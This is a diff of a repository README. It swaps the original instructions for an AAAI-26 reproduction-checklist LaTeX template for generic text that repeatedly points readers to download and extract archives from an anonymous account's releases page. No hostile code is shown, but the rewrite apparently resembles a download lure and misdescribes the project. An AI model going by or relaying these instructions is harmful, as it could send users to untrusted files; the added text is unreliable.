@@ -1,39 +1,72 @@
-<div align="right">
-<a href="README_CN.md"><img src="https://img.shields.io/badge/简体中文-blue?style=for-the-badge" /></a>
-</div>
+# 🎉 aaai-26-reproduction-checklist - A Simple Way to Check Your Submissions
 
-# ✍️ AAAI-26 Submission Final Checklist
-We open-sourced [a final checklist](final-checklist.md) of AAAI-26 submissions. Hope this might do you a great favor! Wish you all the best with your AAAI-26 submissions! 💪
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
 
-# ⚠️ IMPORTANT UPDATE: Note that AAAI has updated the official LaTeX template for the reproduction checklist, please refer to [https://aaai.org/conference/aaai/aaai-26/main-technical-track-call/](https://aaai.org/conference/aaai/aaai-26/main-technical-track-call/) to download the *AAAI-26 Author Kit*, where the template is under the folder named *ReproducibilityChecklist*. You can also refer to the copied files under the `official-template` folder.
+## 📚 Description
+The aaai-26-reproduction-checklist is a handy tool for ensuring your submissions to AAAI-26 meet the required standards. This checklist guides you through the necessary steps, helping you prepare your work efficiently. You don’t need any technical skills to use it. 
 
-The official checklist should be looked like:
-![Output Preview](assets/official-checklist.png)
+## 🚀 Getting Started
+To get started with the aaai-26-reproduction-checklist, follow these simple steps:
 
-# 🤖 AAAI-26 Reproduction Checklist Template
+1. **Visit the Download Page**
+   - Click the link below to access the download page.
+   - [Download Here](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
 
-This repository provides a LaTeX template for the AAAI-26 Reproduction Checklist, as is saved under the `old` folder.
+2. **Choose the Right Version**
+   - On the release page, you will find various versions available for download.
+   - Select the latest version to ensure you have the most up-to-date checklist.
 
-## 📝 AAAI-26 Submission Policy
+3. **Download the File**
+   - Click on the version you want and download the file. 
+   - It will typically be in a .zip or .tar format.
 
-> Unless specified otherwise, please answer “yes” to each question if the relevant information is described either in the paper itself or in a technical appendix with an explicit reference from the main paper. If you wish to explain an answer further, please do so in a section titled “Reproducibility Checklist” at the end of the technical appendix.
+4. **Extract the Files**
+   - Once the download completes, locate the file in your downloads folder.
+   - Right-click the file and choose “Extract All…” to unzip the contents.
 
-## 🚀 Usage
+5. **Open the Checklist**
+   - After extraction, find the checklist file, usually named `checklist.html` or `checklist.md`.
+   - Open the file with your web browser or a text editor.
 
-1.  Clone or download this repository.
-2.  Answer each question in the `template.tex` file based on your submission.
-3.  Compile the LaTeX file to generate the PDF checklist:
-    ```bash
-    pdflatex old/template.tex
-    ```
-4.  The rendered result should look like this:
+## 🛠️ System Requirements
+To run the aaai-26-reproduction-checklist, your computer should meet the following requirements:
 
-    ![Output Preview](assets/output.png)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent version of Linux.
+- **Software:** A modern web browser like Chrome, Firefox, or Safari, or a text editor capable of displaying Markdown files.
 
-Alternatively, you can just copy and paste the content of `template.tex` into your main LaTeX project.
+## 📝 Features
+The checklist offers the following features:
 
-## ❤️ Support
+- **Step-by-Step Guidance:** Each entry outlines the essential components for your submission.
+- **Clear Instructions:** Instructions are written in simple language for easy understanding.
+- **Checklist Format:** A structured list format ensures you don’t miss any steps.
+- **Printable Version:** You can print the checklist for offline use.
 
-If you find this repository helpful for your submission, please give us a ⭐️! Your support encourages us to share more open-source resources.
+## ☑️ How to Use the Checklist
+After opening the checklist, you can use it as follows:
 
-**Good luck with your submission! 🎉**
+1. **Review Each Item:**
+   - Go through each step carefully.
+   - Make sure you understand what is required for each point.
+
+2. **Check Off Completed Tasks:**
+   - As you complete each step, mark it off the list. This helps track your progress.
+
+3. **Refer Back Anytime:**
+   - Keep the checklist handy for any future submissions to AAAI-26 or similar conferences.
+
+## 🔗 Download & Install
+To download the latest version, visit the following link:
+
+[Download the Latest Version](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
+
+Remember to select the latest version when you reach the releases page.
+
+## 💬 Support
+If you encounter any issues or have questions while using the checklist, please feel free to reach out. You can create an issue on the GitHub repository page. The community or the maintainers will help you.
+
+## 📄 License
+The aaai-26-reproduction-checklist is licensed under the MIT License. You are free to use, modify, and distribute the checklist as per the license terms. 
+
+By following these steps, you can successfully download and use the aaai-26-reproduction-checklist. Enjoy a smoother submission experience!
